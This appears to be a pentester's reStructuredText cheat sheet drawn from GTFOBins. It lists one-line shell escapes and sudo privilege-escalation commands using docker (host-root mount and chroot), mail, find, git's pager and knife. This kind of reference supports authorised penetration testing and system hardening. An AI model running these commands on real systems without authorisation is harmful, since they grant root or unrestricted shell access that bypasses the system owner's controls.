`GTFO PE <https://gtfobins.github.io/>`_
********************************************

`Docker <https://gtfobins.github.io/gtfobins/docker/>`_
########################################################

Shell
++++++++++

It can be used to break out from restricted environments by spawning an interactive system shell.

.. code-block:: console

   docker run -v /:/mnt --rm -it <image_name> chroot /mnt sh 

`Mail <https://gtfobins.github.io/gtfobins/mail/>`
#############################################################

Sudo
+++++++

        If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

.. code-block:: console

        sudo mail --exec='!/bin/sh'

Shell
++++++++

It can be used to break out from restricted environments by spawning an interactive system shell.

GNU version only.

.. code-block:: console

   mail --exec='!/bin/sh'

This creates a valid Mbox file which may be required by the binary.

.. code-block:: console

        TF=$(mktemp)
        echo "From nobody@localhost $(date)" > $TF
        mail -f $TF
        !/bin/sh
find
#########

Shell
+++++++++++

.. code-block:: console

        find /etc/passwd -exec /bin/sh \; 

git
################

Shell
+++++++++++++

Way 1

.. code-block:: console

   git help config
        !/bin/sh

way 2

.. code-block:: console

   git branch --help config
        !/bin/sh

Knife
#######################

sudo
++++++++

.. code-block:: console

   sudo knife exec -E 'exec "/bin/sh"'
